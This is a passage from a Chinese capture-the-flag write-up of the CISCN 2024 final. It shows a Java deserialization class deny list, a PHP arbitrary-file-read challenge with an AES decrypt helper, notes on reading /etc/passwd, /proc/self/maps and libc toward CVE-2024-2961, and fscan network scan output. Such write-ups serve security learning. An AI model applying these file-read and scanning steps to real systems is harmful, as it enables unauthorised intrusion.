punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSONArray"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.swing"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">Class</span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"asp"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.management"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"AbstractTranslet"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"jmx"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.lang"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSONArray"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.management"</span><span class="token punctuation">)</span><span class="token operator">||</span>targetc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.swing"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span>SwingPropertyChangeSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">JSONArray</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">XString</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>AlignmentAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>BoldAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>StyledTextAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>UnderlineAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">JSONArray</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">XString</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span> <span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>AlignmentAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">AbstractAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>BoldAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>StyledTextAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">StyledEditorKit<span class="token punctuation">.</span>UnderlineAction</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Fobee（Unsolved）"><a href="#Fobee（Unsolved）" class="headerlink" title="Fobee（Unsolved）"></a>Fobee（Unsolved）</h2><p>没看</p><hr><h1 id="Pwn-PHP（复现）"><a href="#Pwn-PHP（复现）" class="headerlink" title="Pwn-PHP（复现）"></a>Pwn-PHP（复现）</h1><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721224758509.png" alt="image-20240721224758509"></p><p>CVE-2024-2961？</p><p>fix貌似把iconv的so文件扬了就行</p><p>起docker</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> load <span class="token operator">&lt;</span> 2024_ciscn_final_php.tar<span class="token function">docker</span> run <span class="token parameter variable">-tid</span> <span class="token parameter variable">--name</span> final_php <span class="token parameter variable">-p</span> <span class="token number">9998</span>:9999 <span class="token parameter variable">-e</span> <span class="token assign-left variable">FLAG</span><span class="token operator">=</span>flag<span class="token punctuation">&#123;</span>test_flag<span class="token punctuation">&#125;</span> 2024_ciscn_final_php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看一下data.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">base64_decode_data</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// AES加密和解密函数</span><span class="token keyword">function</span> <span class="token function-definition function">aes_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$encrypted</span> <span class="token operator">=</span> <span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'aes-256-cbc'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span><span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$encrypted</span> <span class="token operator">=</span> <span class="token variable">$iv</span> <span class="token operator">.</span> <span class="token variable">$encrypted</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$encrypted</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_blacklisted</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'/root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/home'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/media'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/mnt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/lib64'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/lib'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 添加其他黑名单目录</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted_dir</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$blacklisted_dir</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取Base64编码的文件路径并进行Base64解码</span><span class="token variable">$encoded_file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">base64_decode_data</span><span class="token punctuation">(</span><span class="token variable">$encoded_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_blacklisted</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Access to this directory is not allowed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取文件内容</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 加密文件内容</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Welcome_to_CISCN_2024_Final'</span><span class="token punctuation">;</span>  <span class="token comment">// Actual key</span><span class="token variable">$encrypted_data</span> <span class="token operator">=</span> <span class="token function">aes_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"This is your encrypted file : <span class="token interpolation"><span class="token variable">$encrypted_data</span></span>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件输出的内容加密了一层aes</p><p>读取&#x2F;etc&#x2F;passwd，整一个decrypt函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"BVKJrBujS7bUUE76j0JHe6AQ0rMHAsdTQPUmoHa6Ty9aS7J6FUMpWbmn/vNcOYBk9SdXenOSTE7XgsjuifgtFsZFbf+59Fw0bNZ5CtynJEjGc2Mr/rQqXxw7zaKRbp77iLWLTAVrAEyFed20ayOHvw6mf59iphrfYfkLVtJ18H+73WJcbzB8/gAxbCYPLxUv6cLUhbGW3kuTTjeJabnOUwy64vEsck0mmYVbyh/aXZrQIVZmnSaxIjm5TS1f6EAQU5KaLkXSanIP4k+7VIMQlkhRn0xxcU4VK2HQYxDsZGrr8jDSGl8CSmUWQxtQtJhheG5Xn30Xu6NxLHb/yBsCdLV3deZBL6HkZO9BWaEDFrMljC9Tnf41WP3/EHr/ljRuoQWat0S1U4QP2bkIWsI3o5B0TfCxr1MZBczZQro2uDtUSxvmrijoOB8PahfzsohIqY2PUnkpIHAMFa/cw0uwQePv9zKVGmoGUhlIjjSelwjQVE6E4WV/QGKL4pL1ruWeS78cm1Cf0Hc/WLzpQXOSMkyPp3I7vFqWS1IeLXr0jVod6C7VGtlif0e3wyZwnpAYujl0t3m8ZYu7ms0jfW2LYYkpGPV6OshWrO9OOJAp1UGfsC0wvp6YdCz99l3nQ+iwgQcDo5xQdoGO/LXq8qs8a6FtgRa7F+sbihk5EaAGq8QQzd8MRTpTeciwcxKUdDSo+2n1uQYhE7MukOMrJLlQnvandAxj+ucMJLMh8UDbTgkZ9pky6BzQGgCMXJApvcPccmrpKvNUKuw6ZO93XY93j7aBYPk/jUIUbjPO+PsYCnqRA66viAZ21dlGCQFpHxmYHohja47FxBLU9dfm394+zHvlXIpaJXhdw9KlNlTCn5RnXpHnRm+zynEVflQNFgOKE9MSWx76Y6/11dNu12KYB4GzaR7kd9v/p0MgiYss1MNQOsfvCPIDvm8wEhECy+ej4iECuI5lyqd3icCxq4QxGQtkOY243vfEv3LV4PW4602uO/1pi9BB7TQsLkl1iBQVprmO6aarK6bifywhd2CpDjXZ1YPuuk5G6NsXx+XpbE1R0LkCDZ6HIxDB4CC6bEosOvT9RhsOcw0zd/euo07hBRTYI+TiXui0PeSdchu9KLNvY2twBhpGA+kz7haa8mnXVRgvrIBL2YNIu8lP1x0v/iu2U4bcMubq2DxJArTKgjFfA4HgGy4azbHVm/n7vfYOqAIBaCnnjSlUZh4YBlFhJOFQgChuMHJcUQG+j9H/jy2GFQDZI3imUz2aRB6guzThVQ/1LoYFTSqVaS+6iIKGw9hxyNDMTfhK5vg3T9uq2EmoT6+y3ePETY9YxFV1eWVcO999naFCArEvqZk7t5qyUZHOyDqjVeUMEh73i3mBJubzZuZ7gN8YPwKRei9u97ldqPUBid2uYoLVMOmG4B13pn6QgrvqGXwLmgqUtjVTiy5ctQ6WsK91oSq0gYLqHm2lrTpRTuYYKUDQuAgZSOEaBNmd3uGmjArtUURLqTo2FMsEPaidU4IlPhxINyNI00yJ54HmL7KTVt+Lv+7I/wReUZzHtOiIodlZkiFJI48IQ74="</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Welcome_to_CISCN_2024_Final'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">aes_decrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$encrypted</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$encrypted</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'aes-256-cbc'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span><span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$decrypted_data</span> <span class="token operator">=</span> <span class="token function">aes_decrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以解密出 &#x2F;etc&#x2F;passwd 的内容，但是 &#x2F;flag 不行，因为docker里只有root有读权限</p><p>但是也够用了，读 &#x2F;proc&#x2F;self&#x2F;maps</p><p>然后读 &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</p><p>接下来打cve-2024-2961即可</p><p>但是实际打的时候发现堆那里貌似做了点手脚，导致exp不能一把梭，需要pwn✌支援（</p><hr><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>我不会渗透也没打过云境，内网代理还是前一天现学的，但是根本没建立起一个内网代理的思路，代理还是等巨魔从酒店拿拓展坞回来才开张的（</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721140100586.png" alt="image-20240721140100586"></p><p>传fscan到vps扫一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@vps:~<span class="token comment"># ./fscan -h 192.168.36.88/24</span>   ___                              _      / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ // /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>    <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>                        fscan version: <span class="token number">1.8</span>.3start infoscan<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">192.168</span>.36.88   is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">192.168</span>.36.253  is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">2</span><span class="token number">192.168</span>.36.88:22 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后扫erp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">8.130</span>.44.201   ___                              _  / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __ / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ // /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span><span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span 